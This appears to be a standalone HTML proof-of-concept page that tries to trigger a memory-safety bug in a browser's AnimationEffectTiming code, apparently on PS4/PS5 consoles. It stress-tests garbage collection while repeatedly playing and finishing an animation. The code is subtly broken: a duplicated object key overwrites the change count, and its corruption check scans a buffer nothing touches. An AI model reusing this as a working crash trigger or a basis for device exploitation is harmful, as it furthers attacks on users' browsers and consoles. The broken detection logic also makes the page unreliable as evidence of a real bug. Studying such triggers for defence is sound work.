<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AnimationEffectTiming ASAN PoC (PS4/PS5?)</title>
    <style>
        #trigger {
            margin: 20px 0;
            padding: 12px;
            font-size: 18px;
            cursor: pointer;
        }
        #status {
            margin-top: 10px;
            font-weight: bold;
            color: darkred;
        }
        #console {
            margin-top: 10px;
            white-space: pre-wrap;
            font-family: monospace;
            max-height: 400px;
            overflow-y: auto;
            border: 1px solid #ccc;
            padding: 10px;
        }
        #target {
            width: 100px;
            height: 100px;
            background: red;
        }
    </style>
</head>
<body>
    <h1>AnimationEffectTiming ASAN PoC</h1>
    <p>Click to test ASAN issue in AnimationEffectTiming::getBasicTiming.</p>
    <button id="trigger">TEST ANIMATION</button>
    <div id="status">Idle...</div>
    <div id="console"></div>
    <div id="target"></div>
    <script>
        const status = document.getElementById('status');
        const consoleDiv = document.getElementById('console');
        let attemptCount = 0;

        function log(msg) {
            consoleDiv.append(msg + '\n');
            consoleDiv.scrollTop = consoleDiv.scrollHeight;
        }

        function stressGC() {
            for (let i = 0; i < 1000; i++) {
                new ArrayBuffer(1024 * 1024);
            }
            for (let i = 0; i < 200; i++) {
                new ArrayBuffer(2 * 1024 * 1024);
            }
        }

        function checkMemoryChanges() {
            const buffer = new ArrayBuffer(4096);
            const view = new Uint8Array(buffer);
            for (let i = 0; i < view.length; i++) {
                view[i] = 0x46;
            }
            return () => {
                let changes = 0;
                const changesMap = new Map();
                for (let i = 0; i < view.length; i++) {
                    if (view[i] !== 0x46) {
                        changes++;
                        const key = `0x46->0x${view[i].toString(16).padStart(2, '0')}`;
                        changesMap.set(key, (changesMap.get(key) || 0) + 1);
                    }
                }
                return { changes, changes: [...changesMap] };
            };
        }

        async function detectAnimationIssue() {
            attemptCount++;
            status.textContent = `Attempt ${attemptCount} in progress...`;
            log(`Attempt ${attemptCount} started`);

            try {
                // Create memory checker
                const check = checkMemoryChanges();

                // Create animation
                const target = document.getElementById('target');
                const keyframes = { transform: ['translateX(0)', 'translateX(100px)'] };
                const effect = new KeyframeEffect(target, keyframes, { duration: 1000 });
                let timeline;
                try {
                    timeline = new ScrollTimeline({ source: document.documentElement });
                } catch (e) {
                    log(`ScrollTimeline not supported: ${e.message}`);
                    timeline = document.timeline;
                }
                const animation = new Animation(effect, timeline);

                // Trigger animation and manipulate
                const interval = setInterval(() => {
                    try {
                        animation.play();
                        animation.finish();
                        effect.getComputedTiming();
                        stressGC();
                    } catch (e) {
                        log(`Error in animation: ${e.message}`);
                    }
                }, 10);

                // Check for memory changes or crash
                setTimeout(() => {
                    clearInterval(interval);
                    try {
                        effect.getComputedTiming(); // Trigger getBasicTiming
                    } catch (e) {
                        log(`Error in getComputedTiming: ${e.message}`);
                    }
                    const result = check();
                    if (result.changes > 0) {
                        status.textContent = `Issue detected! ${result.changes} bytes changed`;
                        log(`Issue detected! ${result.changes} bytes changed`);
                        log(`Changes: ${result.changes.map(([k, v]) => `${k} (${v} bytes)`).join(', ')}`);
                    } else {
                        stressGC();
                        setTimeout(() => {
                            const secondResult = check();
                            if (secondResult.changes > 0) {
                                status.textContent = `Issue detected after GC! ${secondResult.changes} bytes changed`;
                                log(`Issue detected after GC! ${secondResult.changes} bytes changed`);
                                log(`Changes: ${secondResult.changes.map(([k, v]) => `${k} (${v} bytes)`).join(', ')}`);
                            } else {
                                status.textContent = 'No issue detected';
                                log('No issue detected');
                            }
                        }, 10);
                    }
                }, 2000);
            } catch (err) {
                status.textContent = `Failed: ${err.message}`;
                log(`Error: ${err.message}`);
            }
        }

        document.getElementById('trigger').addEventListener('click', async () => {
            try {
                await detectAnimationIssue();
            } catch (err) {
                status.textContent = `Failed: ${err.message}`;
                log(`Error: ${err.message}`);
            }
        });
    </script>
</body>
</html>
